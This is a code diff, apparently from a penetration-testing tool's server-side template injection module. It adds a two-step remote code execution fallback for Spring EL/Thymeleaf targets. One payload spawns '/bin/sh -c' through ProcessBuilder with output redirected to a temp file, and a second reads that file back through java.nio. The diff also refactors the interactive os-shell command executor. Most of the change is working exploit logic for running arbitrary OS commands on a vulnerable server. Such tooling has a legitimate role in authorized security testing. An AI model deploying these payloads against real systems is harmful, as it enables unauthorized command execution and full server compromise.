@@ -684,6 +684,78 @@ def _canTakeover(engine, evidence):
     return True
 
 
+# Modern JDKs reflectively block Process.getInputStream()/waitFor() (the package-private
+# java.lang.ProcessImpl), so the in-band stdout-capture RCE payloads silently return NO output on any
+# recent JVM - the common real-world case. Two-step fallback, keyed by exact engine name: run the
+# command redirecting stdout+stderr to a temp file (blind exec; ProcessBuilder is public), then read
+# that file back via the public java.nio.file.Files API. {CMD} = shell-quoted command, {OUTFILE} = temp path.
+_FILE_RCE = {
+    "Spring EL / Thymeleaf": (
+        "${new ProcessBuilder(new String[]{'/bin/sh','-c','{CMD} > {OUTFILE}'}).start()}",
+        "${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('{OUTFILE}')))}",
+    ),
+}
+
+
+def _commandOutput(page, baseline, original, payload, engine):
+    """Extract genuine command output from a response via baseline diff, rejecting error pages and
+    reflected-payload fragments. Returns the cleaned output string, or None when there is none."""
+    if not page:
+        return None
+    if engine.errorRegex and _isError(page, engine):
+        return None
+
+    text = getUnicode(page)
+    baseText = getUnicode(baseline or "")
+    output = ""
+
+    if baseText and text != baseText:
+        sm = difflib.SequenceMatcher(None, baseText, text)
+        parts = [text[j1:j2] for tag, i1, i2, j1, j2 in sm.get_opcodes() if tag in ("insert", "replace")]
+        if parts:
+            output = "".join(parts).strip()
+
+    if not output:
+        output = text
+        if original and output.startswith(original):
+            output = output[len(original):]
+        output = output.strip()
+
+    # A template that ECHOED our payload directive instead of executing it is reflection, not output.
+    if output and output in payload:
+        return None
+
+    if output and _ratio(output, baseText) < UPPER_RATIO_BOUND:
+        if output != baseText.strip() and not (baseText and baseText.replace(original, "").strip() == output):
+            return output
+
+    return None
+
+
+def _fileRceCapture(place, parameter, engine, original, cmd, extract):
+    """Two-step file-based RCE for JDK-hardened Java engines (see _FILE_RCE): fire the exec payload
+    (redirects the command's output to a random temp file), then poll-read that file. 'extract' is a
+    callback (readPayload, page) -> result-or-None. The temp-file write is async of the blind start(),
+    so the read is retried a few times. Returns whatever 'extract' yields, else None."""
+    spec = _FILE_RCE.get(engine.name)
+    if not spec:
+        return None
+
+    execTemplate, readTemplate = spec
+    outFile = "/tmp/%s" % randomStr(length=12, lowercase=True)
+    execPayload = execTemplate.replace("{CMD}", _escapeSingleQuoted(cmd)).replace("{OUTFILE}", outFile)
+    _send(place, parameter, original + execPayload)   # launches the process; its (error) response is ignored
+
+    readPayload = readTemplate.replace("{OUTFILE}", outFile)
+    for _ in range(3):
+        page = _send(place, parameter, original + readPayload)
+        result = extract(readPayload, page)
+        if result is not None:
+            return result
+        time.sleep(1)
+    return None
+
+
 def _probeRce(place, parameter, engine):
     """Benign, quiet RCE-capability check: run `echo <marker>` via the engine's RCE payloads and
     return True if the marker is reflected (proving OS command execution is reachable). Used only
@@ -699,12 +771,16 @@ def _probeRce(place, parameter, engine):
         page = _send(place, parameter, original + payload)
         if page and marker in getUnicode(page):
             return True
-    return False
+
+    # in-band capture blocked (e.g. hardened JDK) -> confirm via the two-step file-based channel
+    return bool(_fileRceCapture(place, parameter, engine, original, "echo %s" % marker,
+                                lambda readPayload, page: True if (page and marker in getUnicode(page)) else None))
 
 
 def _executeCommand(place, parameter, engine, cmd):
-    """Execute an OS command via the engine's RCE payloads, trying each fallback
-    in order until one produces output. Captures output via baseline diff."""
+    """Execute an OS command via the engine's RCE payloads, trying each fallback in order until one
+    produces output (captured via baseline diff), then a two-step file-based fallback for JDK-hardened
+    Java engines whose in-band stdout capture is reflectively blocked (see _FILE_RCE)."""
 
     safeCmd = _escapeSingleQuoted(cmd)
     original = _originalValue(place, parameter) or ""
@@ -712,49 +788,16 @@ def _executeCommand(place, parameter, engine, cmd):
 
     for payloadTemplate, description in engine.rcePayloads:
         payload = payloadTemplate.replace("{CMD}", safeCmd)
-        fullPayload = original + payload
-        page = _send(place, parameter, fullPayload)
+        page = _send(place, parameter, original + payload)
+        output = _commandOutput(page, baseline, original, payload, engine)
+        if output is not None:
+            conf.dumper.singleString("\nos-shell (%s) [%s]:\n%s" % (cmd, description, output))
+            return
 
-        if not page:
-            continue
+    output = _fileRceCapture(place, parameter, engine, original, cmd,
+                             lambda readPayload, page: _commandOutput(page, baseline, original, readPayload, engine))
+    if output is not None:
+        conf.dumper.singleString("\nos-shell (%s) [file-based]:\n%s" % (cmd, output))
+        return
 
-        # Skip error pages (payload caused a template exception, not a shell)
-        if engine.errorRegex and _isError(page, engine):
-            continue
-
-        text = getUnicode(page)
-        baseText = getUnicode(baseline or "")
-        output = ""
-
-        if baseText and text != baseText:
-            sm = difflib.SequenceMatcher(None, baseText, text)
-            opcodes = sm.get_opcodes()
-            parts = []
-            for tag, i1, i2, j1, j2 in opcodes:
-                if tag in ("insert", "replace"):
-                    parts.append(text[j1:j2])
-            if parts:
-                output = "".join(parts).strip()
-
-        if not output:
-            output = text
-            if original and output.startswith(original):
-                output = output[len(original):]
-            output = output.strip()
-
-        # A template that ECHOED our payload directive instead of executing it (e.g. a patched or
-        # sandboxed Velocity reflecting the literal "$ex.waitFor()") is reflection, not command
-        # output: reject it so the loop falls through to the honest "no output received" warning
-        # instead of presenting a reflected payload fragment as a fake command result.
-        if output and output in payload:
-            continue
-
-        # Suppress when output is just the baseline with the original value removed
-        # (command produced no output; the template rendered empty)
-        # Filter out template error messages masquerading as command output
-        if output and _ratio(output, baseText) < UPPER_RATIO_BOUND:
-            if output != baseText.strip() and not (baseText and baseText.replace(original, "").strip() == output):
-                conf.dumper.singleString("\nos-shell (%s) [%s]:\n%s" % (cmd, description, output))
-                return
-
-    logger.warning("no output received for OS command '%s' (tried %d payload(s))" % (cmd, len(engine.rcePayloads)))
+    logger.warning("no output received for OS command '%s'" % cmd)
